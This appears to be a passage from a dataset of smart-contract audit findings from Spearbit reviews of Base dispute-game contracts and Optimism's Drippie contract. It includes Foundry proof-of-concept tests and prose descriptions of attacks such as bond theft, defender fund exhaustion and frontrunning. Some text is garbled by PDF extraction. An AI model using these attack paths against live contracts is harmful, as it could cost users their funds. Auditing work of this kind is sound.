        "body": "When finding an ancestor via the _findTraceAncestor function, the code allows specifying the global flag, which limits the ancestor search to the split depth. When _global is set to false the function uses the _pos.traceAncestorBounded(SPLIT_DEPTH) method. This method violates an invariant assumption: \"It is guaranteed that such a claim exists.\" In scenarios when SPLIT_DEPTH + 1 = MAX_DEPTH. The code, will not be able to find a right-side node, causing the code to loop until reaching the root node. The root node, containing type(uint32).max as its parentIndex, results in an out-of-bounds array access. This issue specifically arises when the last game step is a defend action. Proof of concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import { Test } from \"forge-std/Test.sol\"; import \"../../src/dispute/AnchorStateRegistry.sol\"; import \"../../src/dispute/DisputeGameFactory.sol\"; import \"../../src/dispute/FaultDisputeGame.sol\"; import \"../../src/dispute/lib/LibUDT.sol\"; // oz clones library import \"@openzeppelin/contracts/proxy/Clones.sol\"; contract WETHMock { // balances uint256 totalBalance; mapping(address => uint256) public unlocks; function deposit() external payable { totalBalance += msg.value; 5 } function withdraw(uint256 amount) external { // check unlocks require(unlocks[msg.sender] >= amount, \"WETHMock: insufficient unlocks\"); totalBalance -= amount; payable(msg.sender).transfer(amount); } function unlock(address to, uint256 amount) external { unlocks[to] += amount; } } contract POC is Test { using Clones for address; AnchorStateRegistry internal anchorStateRegistry; DisputeGameFactory internal disputeGameFactory; WETHMock internal weth; address constant ADMIN = address(0x1); function setUp() public { disputeGameFactory = DisputeGameFactory(address(new DisputeGameFactory()).clone()); anchorStateRegistry = AnchorStateRegistry(address(new ,! AnchorStateRegistry(disputeGameFactory)).clone()); disputeGameFactory.initialize(ADMIN); weth = new WETHMock(); } function test_oob_in_findTraceAncestor() public { vm.startPrank(ADMIN); disputeGameFactory.setImplementation( GameType.wrap(0), IDisputeGame(address(new FaultDisputeGame( GameType.wrap(0), // _gameType Claim.wrap(0x0), // _absolutePrestate 2, // _maxGameDepth (max) 1, // _splitDepth Duration.wrap(200), // _clockExtension Duration.wrap(1000), // _maxClockDuration IBigStepper(address(0)), // _vm IDelayedWETH(address(weth)), // _weth IAnchorStateRegistry(address(anchorStateRegistry)), // _anchorStateRegistry 0x123 // _l2ChainId ))) ); vm.stopPrank(); bytes32 anchorRoot = bytes32(uint256(0x1234)); uint256 l2BlockNumber = 0x10; AnchorStateRegistry.StartingAnchorRoot[] memory startingAnchorRoots = new ,! AnchorStateRegistry.StartingAnchorRoot[](1); startingAnchorRoots[0] = AnchorStateRegistry.StartingAnchorRoot({ 6 gameType: GameType.wrap(0), outputRoot: OutputRoot({ root: Hash.wrap(anchorRoot), l2BlockNumber: l2BlockNumber }) }); anchorStateRegistry.initialize( startingAnchorRoots ); uint256 gameL2BlockNumber = 0x11; bytes32 rootClaim = bytes32(uint256(0x1234)); bytes memory extraData = abi.encodePacked(gameL2BlockNumber); FaultDisputeGame game = FaultDisputeGame(address(disputeGameFactory.create( GameType.wrap(0), Claim.wrap(rootClaim), extraData ))); Position disputePosition = Position.wrap(2); // 2 because we attack 1 uint256 amount = game.getRequiredBond(disputePosition); vm.deal(address(0x1), 100 ether); vm.deal(address(0x2), 100 ether); vm.deal(address(0x3), 100 ether); vm.deal(address(0x4), 100 ether); // index 1 vm.prank(address(0x1)); game.move{value: amount}( Claim.wrap(bytes32(uint256(rootClaim))), 0, Claim.wrap(bytes32(uint256(0x2222))), true ); disputePosition = Position.wrap(4); // 4 because we attack 2 amount = game.getRequiredBond(disputePosition); // index 2 vm.prank(address(0x2)); game.move{value: amount}( Claim.wrap(bytes32(uint256(0x2222))), 1, Claim.wrap(bytes32(uint256(1 << 248 | 0x4444))), true ); vm.prank(address(0x3)); game.step( 2, false, \"\", \"\" ); } 7 } Stack Trace: ... [0] console::log(\"traceAncestorPos\", 5) [staticcall] (cid:24) [Stop] [0] console::log(\"ancestor.parentIndex\", 0) [staticcall] (cid:24) [Stop] [0] console::log(\"ancestor.parentIndex\", 4294967295 [4.294e9]) [staticcall] (cid:24) [Stop] (cid:24) [Revert] panic: array out-of-bounds access (0x32) (cid:24) [Revert] panic: array out-of-bounds access (0x32) (cid:24) [Revert] panic: array out-of-bounds access (0x32) Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.31ms (2.44ms CPU time) Ran 1 test suite in 8.02s (7.31ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests) Failing tests: Encountered 1 failing test in test/cryptara/OOB_find.sol:POC [FAIL. Reason: panic: array out-of-bounds access (0x32)] test_oob_in_findTraceAncestor() (gas: 6970940)",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "An attacker with more available funds can counter an honest rootClaim defender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "An attacker (challenger) with more funds available than an honest rootClaim defender can win the Game with the status CHALLENGER.WINS even if the rootClaim provided by the honest defender is correct. The attacker only needs to win one subgame that goes uncountered to counter the rootClaim. This can be achieved by opening so many subGames with different incorrect claims at the same gameTree level until the honest defender runs out of funds. The attacker would open new games at the same level (tree depth) instead of continuing to play the existing subgames closer to the leaves. Once the honest defender has no funds left, one subgame win by the attacker due to opponent timeout is enough to counter the correct rootClaim. We want to point out, that these are the technical mechanisms by which the honest defender would loss the rootSubGame. From a game-theoretical perspective such an attack would cost a lot of money, since all opened subgames with incorrect claims if countered by the honest defender would result in a loss for the attacker. The attacker could theoretically win the entire TVL available on the L2 and might be willing to lose a lot of subgames. 8 On the other hand, anyone can support the honest defender team because it is free money to win and should incentivise to provide the required liquidity. The other parties owning the TVL on the L2 have an incentive as well to protect it.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "challengeRootL2Block can be abused to block honest gamer from receiving the bond.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "In DisputeGame, if the function challengeRootL2Block is called successfully, the challenger wins the root claim subgame and can receive the bond: receive // Issue a special counter to the root claim. This counter will always win the root claim subgame, and ,! // the bond from the root claimant. l2BlockNumberChallenger = msg.sender; l2BlockNumberChallenged = true; When the root claim subgame is resolved, the priority of bond receiver goes to the l2BlockNumberChallenger address: // Distribute the bond to the appropriate party. if (_claimIndex == 0 && l2BlockNumberChallenged) { // Special case: If the root claim has been challenged with the // the bond is always paid out to the issuer of that challenge. address challenger = l2BlockNumberChallenger; _distributeBond(challenger, subgameRootClaim); subgameRootClaim.counteredBy = challenger; } else {  challengeRootL2Block function,  // If the parent was not successfully countered, pay out the parent // If the parent was successfully countered, pay out the parent _distributeBond(countered == address(0) ? subgameRootClaim.claimant : countered, subgameRootClaim); s bond to the challenger. s bond to the claimant.   // Once a subgame is resolved, we percolate the result up the DAG so subsequent calls to // resolveClaim will not need to traverse this subgame. subgameRootClaim.counteredBy = countered; } But consider that a malicious user proposes an output claim with an invalid l2 block number, an honest gamer makes a challenge by constructing payload via attack and step function, then the honest gamer should be entitled to receive the bond. However, the malicious user spots the challenge and realizes he will lose their bond, they can always call chal- lengeRootL2Block to win the root subgame, while the dispute game cannot be used to verify the withdraw trans- action, the challengeRootL2Block function is abused to block the honest gamer from receiving the bond.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "FaultDisputeGame.step function can be called after parentClaim is resolved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The step function does not check the chess clock time. This means that the MAX_CLOCK_DURATION could already have been reached and the parent claim could already be resolved as uncountered. The step function would be executed successfully and would overwrite the parent.counteredBy = msg.sender; but with no impact, since the the parent subgame has been already resolved. The msg.sender would not receive a reward, since the payout already did happen.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "challengeRootL2Block called between resolveClaim and resolve would result in incorrect GameSta- tus and state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "If the defender of the rootClaim proposed an incorrect l2BlockNumber() anyone can challenge this by calling challengeRootL2Block by providing the preimage of the output root together with L2 block header to proof that l2BlockNumber is incorrect. A successful challengeRootL2Block should always lead to the following outcome:  After final resolve of the game: GameStatus.CHALLENGER_WINS;  The caller of the challengeRootL2Block should receive the bond from the root sub game. The l2BlockNumberChallenger = msg.sender; // caller of l2BlockNumberChallenged = true;  challengeRootL2Block  Problem: If the called between resolveClaim and resolve. The resolvedSubgames[0] is already resolved. The implications would be GameStatus can be CHALLENGER_WINS or DEFENDER_WINS independent of the chal- lengeRootL2Block outcome. The caller of challengeRootL2Block would receive no rewards, since the payout already happend. However, the status would still updated for l2BlockNumberChallenger and l2BlockNumberChallenged. This can lead to the final game state which should never be the case: l2BlockNumberChallenged = true; status = GameStatus.DEFENDER_WINS;",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Extension period not applied correctly for next root when SPLIT_DEPTH is set to 1 or less",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "When SPLIT_DEPTH is set to 1, the extension period for the next root is not considered, resulting in the root claim not receiving the intended extension time. This occurs because the calculation SPLIT_DEPTH - 1 results in 0, leading to the nextPositionDepth value being 0, and hence no extension period is applied. This discrepancy results in the subgame root at position 2 having a normal extension period instead of the extended time it should receive. Moreover, if the SPLIT_DEPTH is set to 0, the SPLIT_DEPTH - 1 statement will underflow and always revert, leaving the state unusable until the clock time expires. Proof of concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import { Test } from \"forge-std/Test.sol\"; import \"../../src/dispute/AnchorStateRegistry.sol\"; import \"../../src/dispute/DisputeGameFactory.sol\"; import \"../../src/dispute/FaultDisputeGame.sol\"; import \"../../src/dispute/lib/LibUDT.sol\"; // oz clones library import \"@openzeppelin/contracts/proxy/Clones.sol\"; contract WETHMock { // balances uint256 totalBalance; mapping(address => uint256) public unlocks; function deposit() external payable { totalBalance += msg.value; } function withdraw(uint256 amount) external { // check unlocks require(unlocks[msg.sender] >= amount, \"WETHMock: insufficient unlocks\"); totalBalance -= amount; payable(msg.sender).transfer(amount); } 11 function unlock(address to, uint256 amount) external { unlocks[to] += amount; } } contract POC is Test { using Clones for address; AnchorStateRegistry internal anchorStateRegistry; DisputeGameFactory internal disputeGameFactory; WETHMock internal weth; address constant ADMIN = address(0x1); function setUp() public { disputeGameFactory = DisputeGameFactory(address(new DisputeGameFactory()).clone()); anchorStateRegistry = AnchorStateRegistry(address(new ,! AnchorStateRegistry(disputeGameFactory)).clone()); disputeGameFactory.initialize(ADMIN); weth = new WETHMock(); } function test_valid_game_split_1_no_duration() public { vm.startPrank(ADMIN); disputeGameFactory.setImplementation( GameType.wrap(0), IDisputeGame(address(new FaultDisputeGame( GameType.wrap(0), // _gameType Claim.wrap(0x0), // _absolutePrestate 5, // _maxGameDepth (max) 1, // _splitDepth Duration.wrap(200), // _clockExtension Duration.wrap(1000), // _maxClockDuration IBigStepper(address(0)), // _vm IDelayedWETH(address(weth)), // _weth IAnchorStateRegistry(address(anchorStateRegistry)), // _anchorStateRegistry 0x123 // _l2ChainId ))) ); vm.stopPrank(); bytes32 anchorRoot = bytes32(uint256(0x1234)); uint256 l2BlockNumber = 0x10; AnchorStateRegistry.StartingAnchorRoot[] memory startingAnchorRoots = new ,! AnchorStateRegistry.StartingAnchorRoot[](1); startingAnchorRoots[0] = AnchorStateRegistry.StartingAnchorRoot({ gameType: GameType.wrap(0), outputRoot: OutputRoot({ root: Hash.wrap(anchorRoot), l2BlockNumber: l2BlockNumber }) }); 12 anchorStateRegistry.initialize( startingAnchorRoots ); uint256 gameL2BlockNumber = 0x11; bytes32 rootClaim = bytes32(uint256(0x1234)); bytes memory extraData = abi.encodePacked(gameL2BlockNumber); FaultDisputeGame game = FaultDisputeGame(address(disputeGameFactory.create( GameType.wrap(0), Claim.wrap(rootClaim), extraData ))); bytes32 disputeClaim = bytes32(uint256(rootClaim)); // MUST be the same uint256 disputeIndex = 0; bytes32 disputeNextClaim = bytes32(uint256(0x5678)); bool disputeIsAttack = true; Position disputePosition = Position.wrap(2); // 2 because we attack 1 uint256 amount = game.getRequiredBond(disputePosition); vm.warp(1000); // This is 1 second away to exhaust the clock, should give at least Extension ,! time Duration _nextDuration = game.getChallengerDuration(0); console.log(\"Max Clock Duration: %d\", 1000); console.log(\"Clock Extension: %d\", 200); if(_nextDuration.raw() > 1000 - 200) { console.log(\"Not enough time, we need to increase the clock by extension\"); } ( , , , , , Position position, Clock clock ) = game.claimData(0); Position nextPosition = position.move(disputeIsAttack); uint256 nextPositionDepth = nextPosition.depth(); console.log(\"Next Position Depth: %d\", nextPositionDepth); // Since next position depth is 1, the next position will have no time extension. game.move{value: amount}( Claim.wrap(disputeClaim), disputeIndex, Claim.wrap(disputeNextClaim), disputeIsAttack ); ( , , , , , , Clock clockNew ) = game.claimData(1); console.log(\"Clock New duration: %d\", clockNew.duration().raw()); 13 // The expected duration should be bigger than a normal clock extension // as the next position is a root claim of a bisection sub-game. } }",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent _partOffset check and memory boundaries in loadLocalData function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The loadLocalData function in the PreimageOracle contract has a parameter called _partOffset used to read data from memory after it has been prepared. There are inconsistencies and potential issues with this implementation: 1. Inconsistent _partOffset Handling:  The _partOffset parameter is handled inconsistently compared to other parts of the code. For in- stance, _partOffset == 40 is allowed here but not elsewhere, where the assembly code checks via iszero(lt(_partOffset, 0x28)). This inconsistency can lead to scenarios where _partOffset val- ues are valid in one context but not in another.  The current offset check uses _partOffset > _size + 8. This should be _partOffset >= _size + 8 to correctly prevent out-of-bounds access. 2. Memory Boundaries:  The function is designed to operate within the scratch space in memory, ranging from 0x00 to 0x40. The free memory pointer begins at position 0x40. Since the highest possible _partOffset is 0x28, an mload operation would read 32 bytes from 0x28 to 0x48, including the highest bytes of the free memory pointer, which are not used. This can lead to potential issues when reading parts of the free memory pointer.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Preimage proposals can be initialized multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "initLPP() doesn't check if a proposal already exists, allowing multiple initialisations with the same _uuid. Since the proposalBonds is assigned to msg.value instead of incremented, this would result in loss of funds.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_clockExtension and _maxClockDuration are not validated correctly in DisputeGame constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "In the constructor of the dispute game, the code validates that the clock extension cannot exceed the max clock duration: // The clock extension may not be greater than the max clock duration. if (_clockExtension.raw() > _maxClockDuration.raw()) revert InvalidClockExtension(); But when the clock extension is granted, If the potential grandchild is an execution trace bisection root, the clock extension is doubled: uint64 extensionPeriod = nextPositionDepth == SPLIT_DEPTH - 1 ? CLOCK_EXTENSION.raw() * 2 : CLOCK_EXTENSION.raw(); nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod); If the max duration is set to 7 days, but the clock extension is set to 4 days, when the clock extension is doubled to 8 days, the move transaction will revert, because 7 days - 8 days when extending the clock. nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add more integration tests with Big Stepper VM execution for DisputeGame#step",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "When a step function is called in dispute game, the user may need to pass in the proof bytes. However, in the test case, the proof bytes are always empty when calling dispute game step function to resolve a claim. The test passes, but the mock test AlphabetVM does not consume the proof data: /// @title AlphabetVM /// @dev A mock VM for the purpose of testing the dispute game infrastructure. Note that this only works /// for games with an execution trace subgame max depth of 3 (8 instructions per subgame). contract AlphabetVM is IBigStepper { And the comments explicitly mention the mock VM only works for games with an execution trace subgame max depth of 3 (8 instructions per subgame).",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "FaultDisputeGame no existing tests for subgames resolution at the same leftmostPosition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The resolution in the FaultDisputeGame follows the rule of the leftmost child subgame which is uncountered should win the subgame.   // If the child subgame is uncountered and further left than the current left-most counter, // update the parent subgame // The left-most correct counter is preferred in bond payouts in order to discourage attackers // from countering invalid subgame roots via an invalid defense position. As such positions // cannot be correctly countered. // Note that correctly positioned defense, but invalid claimes can still be successfully countered. if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() > claim.position.raw()) { address and the current leftmostCounter countered    . s checkpoint.counteredBy = claim.claimant; checkpoint.leftmostPosition = claim.position; } In case multiple child subgames exists at the same position.raw the one with a lower index in challengeIndices would be iterated first by the loop and would be considered. uint256[] storage challengeIndices = subgames[_claimIndex]; Therefore, the honest challenger should always continue to play with the leftmost position, if at the same position the child subgame with a lower challengeIndices. However, this part doesn't seem to be tested. The condition can be changed to the opposite (The one with the highest challengeIndices should win if the position is the same, the loop would overwrite the checkpoint for the same position). - if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() = claim.position.raw()) + if (claim.counteredBy == address(0) && checkpoint.leftmostPosition.raw() >= claim.position.raw()) All tests would still pass.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "honest defender with limited funds can lose all their ETH if they play with the wrong game strategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "Each move in a FaultDisputeGame requires an additional deposit. It is not true that an honest defender would always win and receive their funds back, plus the bonds of the opponent player if their budget is limited. If the honest defender follows the most intuitive strategy of: If a challenger opens a new subgame with an incorrect claim, the defender should immediately counter it as long as they have enough funds. An attacker could open multiple subgames at the same level but with different incorrect claims until the defender runs out of funds. Afterwards, the attacker could move against all the defender subgames. The defender would have no funds to continue and would lose all their games by timeout.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simpler clean highest byte operation for PreimageOracle and PreimageKeylib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The PreimageOracle uses the highest byte of a key to indicate the type. Before the the type can be set it is required to set the highest byte to zero. This operation happens multiple in the PreimageOracle and in the PreimageKeylib. This is currently done with a bit mask which first needs to be generated. and(h, not(shl(248, 0xFF)))",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "FaultDisputeGame.step incorrect comment about number of leaves calculation for each execution trace subgame",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The comment preStateClaim for the leftmost leaf of each execution trace subgame. in FaultDisputeGame.sol incorrectly describes the condition for determining 18  s index at depth is 0, the prestate is the absolute // If the step position // prestate. // If the step is an attack at a trace index > 0, the prestate exists elsewhere in // the game state. // NOTE: We localize the // // // preStateClaim = (stepPos.indexAtDepth() % (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH))) == 0 ? ABSOLUTE_PRESTATE : _findTraceAncestor(Position.wrap(parentPos.raw() - 1), parent.parentIndex, false).claim; the remainder of the index at depth divided by 2 ** (MAX_GAME_DEPTH - SPLIT_DEPTH), which is the number of leaves in each execution trace subgame. This is so that we can determine whether or not the step position is represents the for the current execution trace subgame by finding ABSOLUTE_PRESTATE indexAtDepth   .   The correct calculation for the number of leaves in the execution trace trees should be: (1 << (MAX_GAME_DEPTH - SPLIT_DEPTH - 1)) The execution trace roots are located at SPLIT_DEPTH + 1, making the current calculation (1 << (MAX_GAME_- DEPTH - SPLIT_DEPTH)) double the actual number of leaf nodes. However, the stepPos here is already one level below the MAX_GAME_DEPTH at MAX_GAME_DEPTH + 1. The current implementation works correctly because the stepPos in an attack case is double the parentPos. // gindex of nextStep in attack scenario stepPos = parentPos * 2; Therefore, the left and right side of the modulo operator will be double the amount and compute the correct result in the modulo equals zero case. Example: For MAX_GAME_DEPTH = 4 and SPLIT_DEPTH = 2:  Correct number of leaves: 2 ** (4-2-1) = 2 and not 4.  Current implementation works correctly because (x % 2) == (2x % 4) holds true if x % 2 == 0. General Form x mod y = (2x) mod (2y) The condition holds true if and only if x mod y = 0.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancies in handling extraData in dispute game",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The current arbitrary-length extraData. However, the dispute game treats this extraData as a single 32-byte value for the l2BlockNumber. There are several discrepancies and areas for improvement: 1. Offset Descriptions: The factory uses non-hexadecimal numbers for offset descriptions, while the fault game uses hexadecimal numbers. This inconsistency can lead to confusion. 2. Handling extraData: If more than 32 bytes of extraData is passed, only the first 32 bytes corresponding to l2BlockNumber are fetched. The code should use return _getArgBytes()[0x54:] to return all the extraData. 19 3. initialize Function",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimize check order to revert early for cost-efficient execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The referenced lines have checks that can be performed earlier, before external calls and state updates. This would avoid wasting unnecessary gas from these checks' failures.  In dispute game step function, if a parent claim is already countered, the user cannot counter the claim again by changing the msg.sender: // INVARIANT: A step cannot be made against a claim for a second time. if (parent.counteredBy != address(0)) revert DuplicateStep(); // Set the parent claim as countered. We do not need to append a new claim to the game; // instead, we can just set the existing parent as countered. parent.counteredBy = msg.sender; The check runs after the VM.step executes. It is recommended to move this check before running the claim verification and vm execution logic.  In PreimageOracle loadBlobPreimagePart function, it is recommended to move the _partOffset validation logic before validating the KZG proof.  In PreimageOracle addLeavesLPP function, it is recommended to move the number of bytes processed and claimed size validation logic before extracting the Preimage Part logic.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Theoretical MAX_POSITION_BITLEN is larger",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The MAX_POSITION_BITLEN in the LibPosition library is currently set to 126. However, given that the maximum index for a given depth is determined by 2depth (cid:0) 1, and the depth can be increased up to 127, the MAX_POSITION_BITLEN can theoretically be set to 127. This change would ensure the maximum depth and index fits within the bounds of a 128-bit value. 2depth + 2depth (cid:0) 1 (cid:20) 2128 (cid:0) 1 depth + 1 (cid:20) 128 depth (cid:20) 127",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unexpected index notation in libraries",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The LibClock, GameId and LPPMetadataLib libraries describe the layout of packed data using MSb (Most Significant bit) notation, which can be confusing given Ethereum's data can span up to 256 bits. The description should use LSb (Least Significant bit) notation to align with common practices and improve readability. Specifically, describing the layout as bits 0-64 for the timestamp and bits 64-128 for the duration will help in understanding and ensuring consistency with the shr and shl operations used in the code. Change index notation from Msb to Lsb: N(cid:0)1 X i=0 bi (cid:1) 2N(cid:0)1(cid:0)i ! N(cid:0)1 X i=0 bi (cid:1) 2i",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment and Variable improvements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The following are typos, comment improvements for clarity and variable improvements for consis- tency.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Duplicate and Zero-Value Checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The initialize function in the AnchorStateRegistry contract does not currently check whether an anchor for a given gameType is already set or if the outputRoot is zero. This oversight can lead to duplicate entries and potentially invalid states, which could disrupt the functionality of the contract. Similarly, the constructor in PreImageOracle doesn't check if the _minProposalSize is zero. It is important for it to be non-zero as it is a condition for checking initialisation in addLeavesLPP .",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Immutable address validation on AnchorStateRegistry",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf",
        "body": "The DISPUTE_GAME_FACTORY address in the AnchorStateRegistry contract is marked as immutable and is set during the contract deployment. However, there is no validation to ensure that the address provided is correct and points to a valid IDisputeGameFactory contract. If an incorrect address is provided, the contract would have to be redeployed, which is costly and inefficient. This could be prevented by validating the address during the contract construction.",
        "labels": [
            "Spearbit",
            "Base",
            "Severity: Informational"
        ]
    },
    {
        "title": "Permitting Multiple Drip Calls Per Block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "state.config.interval is 0. We are currently unaware of use cases where this is desirable. The inline comments correctly note that reentrancy is possible and permitted when Reentrancy is one risk, flashbot bundles are a similar risk where the drip may be called multiple times by the same actor in a single block. A malicious actor may abuse this ability, especially if interval is misconfigured as 0 due to JavaScript type coercion. A reentrant call or flashbot bundle may be used to frontrun an owner attempting to archive a drip or attempting to withdraw assets.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Version Bump to Latest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "During the review, a new version of solidity was released with an important bugfix.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DOS from External Calls in Drippie.executable / Drippie.drip",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "In both the executable and drip (which also calls executable) functions, the Drippie contract interacts with some external contract via low-level calls. The external call could revert or fail with an Out of Gas exception causing the entire drip to fail. The severity is low beacuse in the case where a drip reverts due to a misconfigured or malicious dripcheck or target, the drip can still be archived and a new one can be created by the owner.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use call.value over transfer in withdrawETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "transfer is no longer recommended as a default due to unpredictable gas cost changes in future evm hard forks (see here for more background.) While useful to use transfer in some cases (such as sending to EOA or contract which does not process data in the fallback or receiver functions), this particular contract does not benefit: withdrawETH is already owner gated and is not at risk of reentrancy as owner already has permission to drain the contracts ether in a single call should they choose.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Input Validation Checks for Drippie.create",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drippie.create does not validate input potentially leading to unintended results. The function should check:  _name is not an empty string to avoid creating drip that would be able to read on frontend UI.  _config.dripcheck should not be address(0) otherwise executable will always revert.  _config.actions.length should be at least one (_config.actions.length > 0) to prevent creating drips that do nothing when executed.  DripAction.target should not be address(0) to prevent burning ETH or interacting with the zero address during drips execution.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ownership Initialization and Transfer Safety on Owned.setOwner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Scenario 1 Drippie allows the owner to be both initialized and set to address(0). If this scenario happens nobody will be able to manage the Drippie contract, thus preventing any of the following operations:  Creating a new drip  Updating a drips status (pausing, activating or archiving a drip) If set to the zero address, all the onlyOwner operations in AssetReceiver and Transactor will be uncallable. This scenario where the owner can be set to address(0) can occur when address(0) is passed to the construc- tor or setOwner.  Scenario 2 owner may be set to address(this). Given the static nature of DripAction.target and DripAction.data there is no benefit of setting owner to address(this), and all instances can be assumed to have been done so in error.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unchecked Return and Handling of Non-standard Tokens in AssetReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The current AssetReceiver contract implement \"direct\" ETH and ERC20 token transfers, but does not cover edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers  adhere to ERC20 interface (i.e. no return value) An ERC20 token that does not revert on failure would cause the WithdrewERC20 event to emit even though no transfer took place. An ERC20 token that does not have a return value will revert even if the call would have otherwise been successful. Solmate libraries already used inside the project offer a utility library called SafeTransferLib.sol which covers such edge cases. Be aware of the developer comments in the natspec: /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer. /// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
